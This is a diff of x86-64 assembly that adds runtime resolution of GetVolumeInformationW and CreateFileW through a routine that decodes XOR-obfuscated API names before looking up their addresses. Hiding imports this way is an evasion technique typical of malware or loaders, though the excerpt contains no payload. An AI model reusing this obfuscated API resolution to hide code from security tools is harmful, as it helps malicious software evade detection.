@@ -1029,7 +1029,15 @@ populate_kernel_function_ptrs_by_name:
     xor r9, r9
     call unxor_and_get_proc_addr                ; proc addr
 
-    mov [get_volume_information_a], rax         ; GetVolumeInformation addr
+    mov [get_volume_information_a], rax         ; GetVolumeInformationA addr
+
+    mov rcx, [rbp + 16]
+    mov rdx, get_volume_information_w_xor
+    mov r8, get_volume_information_w_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [get_volume_information_w], rax         ; GetVolumeInformationW addr
 
     mov rcx, [rbp + 16]
     mov rdx, get_module_handle_a_xor
@@ -1086,6 +1094,14 @@ populate_kernel_function_ptrs_by_name:
     call unxor_and_get_proc_addr                ; proc addr
 
     mov [create_file_a], rax                    ; CreateFileA addr
+
+    mov rcx, [rbp + 16]
+    mov rdx, create_file_w_xor
+    mov r8, create_file_w_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [create_file_w], rax                    ; CreateFileW addr
 
     mov rcx, [rbp + 16]
     mov rdx, read_file_xor
